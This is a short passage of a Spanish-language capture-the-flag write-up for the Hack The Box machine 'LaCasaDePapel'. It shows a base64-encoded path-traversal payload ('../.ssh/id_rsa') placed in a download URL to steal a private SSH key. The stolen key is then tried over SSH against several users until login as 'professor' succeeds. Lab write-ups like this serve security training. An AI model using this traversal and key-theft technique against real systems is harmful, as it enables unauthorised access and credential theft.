## Vuln exploit & Gaining Access {-}

### SSH {-}

```bash
echo -n '../.ssh/id_rsa' | base64
#Output
Li4vLnNzaC9pZF9yc2E=
```

y con la url `https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=` descargamos el fichero id_rsa.

```bash
mv /home/s4vitar/Descargas/firefox/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa berlin@10.10.10.131
```

como no va intentamos con los otros usuarios.

```bash
ssh -i id_rsa berlin@10.10.10.131
ssh -i id_rsa dali@10.10.10.131
ssh -i id_rsa nairobi@10.10.10.131
ssh -i id_rsa oslo@10.10.10.131
ssh -i id_rsa professor@10.10.10.131
```

Hemos ganado accesso al systema como el usuario professor.
